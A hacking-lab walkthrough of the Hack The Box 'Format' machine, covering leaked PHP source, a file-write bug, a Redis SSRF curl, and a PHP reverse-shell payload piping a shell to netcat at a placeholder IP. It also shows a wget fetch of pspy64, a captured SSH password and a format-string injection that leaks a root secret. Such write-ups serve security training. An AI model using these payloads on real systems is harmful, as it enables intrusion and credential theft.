# Recon

~~~
sudo nmap -sC -sV 10.129.222.79
~~~

~~~
┌─[mr_g0d@parrot]─[/media/mr_g0d/MR_G0D(500G/GOD/HTB/MACHINES/format]
└──╼ $nmap -sC -sV 10.129.224.53
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 01:41 IST
Nmap scan report for microblog.htb (10.129.224.53)
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: 404 Not Found
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-title:  Microblog
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.74 seconds

~~~

With this hints , I visited both ports 80 and 3000 .Both are redirected to 2 domains ,

app.microblog.htb and microblog.htb:3000

so add those domains to /etc/hosts

~~~
sudo sh -c 'echo "10.129.224.53 microblog.htb app.microblog.htb" >> /etc/hosts'
~~~

After that i visited thier site : app.microblog.htb , i registered a account....

![[dashboard.png]]

Got Dashboard..!!!

Below we can see some popup  that say **Wanna go pro and upload images for only $5 a month**

It may be our next mission we have to get pro..!! let me check later..!!!

Before that we have to VISIT another domain , **microblog.htb:3000**

I  got a gitea   page....!!!

![[cooper gitea.png]]


![[got content gitea.png]]

I checked **microblog/microblog/sunny/index.php**

~~~
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();

function checkAuth() {
    return(isset($_SESSION['username']));
}

function checkOwner() {
    if(checkAuth()) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
        $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
        if(in_array($subdomain, $userSites)) {
            return $_SESSION['username'];
        }
    }
    return "";
}

function getFirstName() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $firstName = $redis->HGET($_SESSION['username'], "first-name");
        return "\"" . ucfirst(strval($firstName)) . "\"";
    }
}

function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}
~~~

Later i checked **microblog/microblog/sunny/edit/index.php**


~~~
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();
if(file_exists("bulletproof.php")) {
    require_once "bulletproof.php";
}

if(is_null($_SESSION['username'])) {
    header("Location: /");
    exit;
}

function checkUserOwnsBlog() {
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
    $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
    if(!in_array($subdomain, $userSites)) {
        header("Location: /");
        exit;
    }
}

function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

//always check user owns blog before proceeding with any actions
checkUserOwnsBlog();

//provision pro environment for new pro users
provisionProUser();

//delete section
if(isset($_POST['action']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $contents = file_get_contents("order.txt");
    $contents = str_replace($_POST['id'] . "\n", '', $contents);
    file_put_contents("order.txt", $contents);

    //delete image file if content is image
    $data = file_get_contents($_POST['id']);
    $img_check = substr($data, 0, 26);
    if($img_check === "<div class = \"blog-image\">") {
        $startsAt = strpos($data, "<img src = \"/uploads/") + strlen("<img src = \"/uploads/");
        $endsAt = strpos($data, "\" /></div>", $startsAt);
        $fileToDelete = substr($data, $startsAt, $endsAt - $startsAt);
        chdir(getcwd() . "/../uploads");
        $file_pointer = $fileToDelete;
        unlink($file_pointer);
        chdir(getcwd() . "/../content");
    }
    $file_pointer = $_POST['id'];
    unlink($file_pointer);
    return "Section deleted successfully";
}

//add header
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add image
if (isset($_FILES['image']) && isset($_POST['id'])) {
    if(isPro() === "false") {
        print_r("Pro subscription required to upload images");
        header("Location: /edit?message=Pro subscription required&status=fail");
        exit();
    }
    $image = new Bulletproof\Image($_FILES);
    $image->setLocation(getcwd() . "/../uploads");
    $image->setSize(100, 3000000);
    $image->setMime(array('png'));

    if($image["image"]) {
        $upload = $image->upload();

        if($upload) {
            $upload_path = "/uploads/" . $upload->getName() . ".png";
            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
            chdir(getcwd() . "/../content");
            $post_file = fopen("{$_POST['id']}", "w");
            fwrite($post_file, $html);
            fclose($post_file);
            $order_file = fopen("order.txt", "a");
            fwrite($order_file, $_POST['id'] . "\n");  
            fclose($order_file);
            header("Location: /edit?message=Image uploaded successfully&status=success");
        }
        else {
            header("Location: /edit?message=Image upload failed&status=fail");
        }
    }
}

function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}

function getBlogName() {
    return '"' . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . '"';
}

function getFirstName() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $firstName = $redis->HGET($_SESSION['username'], "first-name");
        return "\"" . ucfirst(strval($firstName)) . "\"";
    }
}

function fetchPage() {
    chdir(getcwd() . "/../content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}

?>
~~~

Yes..!!!! **Found LFI..!!!! in Function Header..!!!!**

~~~
//add header
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}
~~~

![[got lfi.png]]


![[burp id lfi.png]]


**Content /etc/passwd 

~~~
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
cooper:x:1000:1000::/home/cooper:/bin/bash
redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
~~~

Here the user is cooper..!!! He is the SSH user ..!!!

Remember ..!! we have to get pro right ??

Check the source code again..!!!!

Found this ,

~~~
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
~~~

~~~
curl -X "HSET" http://microblog.htb/static/unix:/var/run/redis/redis.sock:abc pro true a/b
~~~

~~~
curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:abc%20pro%20true%20a/b
~~~

With this we can get pro  here "abc" is user..!!!

after this , i got pro user benifits like now i can upload image too..!!

Guessing is right ..!!now we can upload our payload .. So that we can  get shell..!!!

~~~
id=/var/www/microblog/abc/uploads/rev.php&header=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+<IP>+<PORT>+>/tmp/f")%3b%3f>
~~~

Also dont forgot to start Netcat listener..!!!

~~~
sudo nc -lvnp <PORT>
~~~

![[Pasted image 20230516013855.png]]

Finally after  some try , Got the shelll....!!!

got shell as www-data....

There i searched for some credentials..!!!No use later i used pspy64

~~~
wget http://10.10.14.27/pspy64
~~~

make it executable ...

~~~
chmod +x pspy64
~~~

~~~
./pspy64
~~~

After some time .. I can seee some credentials

~~~
2023/05/15 06:45:01 CMD: UID=0    PID=4802   | /usr/bin/redis-cli -s /var/run/redis/redis.sock HSET cooper.dooper password zooperdoopercooper 
~~~

SSH credentials..!!!

~~~
cooper : zooperdoopercooper
~~~

![[got ssh password.png]]

~~~
sudo ssh cooper@10.129.223.103
~~~

Got user flag..!!!

~~~
cooper@format:~$ ls
user.txt
cooper@format:~$ cat user.txt 
8eeceec02498f069c23e4be159adc4bc
~~~

~~~
sudo -l
~~~

~~~
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
~~~

Reference : https://podalirius.net/en/articles/python-format-string-vulnerabilities/


## For root 

~~~
redis-cli -s /var/run/redis/redis.sock
~~~

Here "abc" is the username 
~~~
HMSET abc first-name "{license.__init__.__globals__[secret_encoded]}" last-name abc username abc
~~~

~~~
sudo /usr/bin/license -p abc
~~~

~~~
sudo /usr/bin/license -p love

Plaintext license key:
------------------------------------------------------
microbloglove$%WR#JXu`W]r[Av*juQ<-#-\(WaE_hT&lVx6U8P:b'unCR4ckaBL3Pa$$w0rd'love

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkYU9FSu7yns9UVhFxQuipuV6ELPFNZLQiNrJpOnOUL_KaBjsvGJ64agNO95nU6RakhdcGt1pG0Y_jyYb5fpky8Cx5nccts4KUsiLYZlAk6PfVxRioLHaJESNe8cpkf_cPrx4FGO3JSpBixaKdSgi59ux8KGZTukv8pZpyoUGiRGUH7Ok=
~~~

![[gopt rooot.png]]